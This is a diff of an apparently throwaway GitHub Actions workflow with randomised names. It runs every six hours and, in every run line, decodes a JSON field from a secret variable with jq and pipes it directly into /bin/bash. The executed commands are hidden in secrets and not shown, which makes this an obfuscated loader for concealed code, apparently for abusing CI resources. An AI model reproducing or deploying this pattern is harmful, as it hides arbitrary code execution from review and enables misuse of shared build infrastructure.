@@ -1,8 +1,9 @@
 name: zhangyuqing6758
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 2/6 * * *'
+    - cron: '27 1/6 * * *'
 
 jobs:
   build:
@@ -11,24 +12,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhangyuqing6758
         env:
-          kuidg19: ${{ secrets.kuidg19 }}
+          vzr088: ${{ secrets.vzr088 }}
         run: |
-          echo $kuidg19 | jq -r .srd246 | /bin/bash
-          echo $mttta145 | jq -r .rxp6468 | /bin/bash
-          echo $zig601 | jq -r .pn30242 | /bin/bash
-          echo $o99602 | jq -r .fmph52 | /bin/bash
-          echo $xixi03 | jq -r .sfe89339 | /bin/bash
-          echo $y50222 | jq -r .oou58955 | /bin/bash
-          echo $k05905 | jq -r .yor1572 | /bin/bash
-          echo $vf310 | jq -r .h0608 | /bin/bash
-          echo $jcm06209 | jq -r .ulke71 | /bin/bash
-          echo $pkqc78 | jq -r .isn40857 | /bin/bash
-          echo $fd1133 | jq -r .km691 | /bin/bash
-          echo $urwq889 | jq -r .d27857 | /bin/bash
-          echo $l539 | jq -r .p5724 | /bin/bash
-          echo $xdx04506 | jq -r .ix25 | /bin/bash
-          echo $ab88675 | jq -r .align893 | /bin/bash
-          echo $wclc62989 | jq -r .u02897 | /bin/bash
-          echo $xegik1 | jq -r .ndxiz37922 | /bin/bash
-          echo $xqx7175 | jq -r .b5470 | /bin/bash
+          echo $vzr088 | jq -r .oen2431 | /bin/bash
+          echo $dqy44014 | jq -r .r881 | /bin/bash
+          echo $jrrzj10527 | jq -r .abf74385 | /bin/bash
+          echo $sdmtl84 | jq -r .zi8 | /bin/bash
+          echo $nnmx468 | jq -r .zmw98392 | /bin/bash
+          echo $lho55 | jq -r .k68 | /bin/bash
+          echo $eyayg255 | jq -r .nfu11 | /bin/bash
+          echo $zabtt19214 | jq -r .jorlk01817 | /bin/bash
 
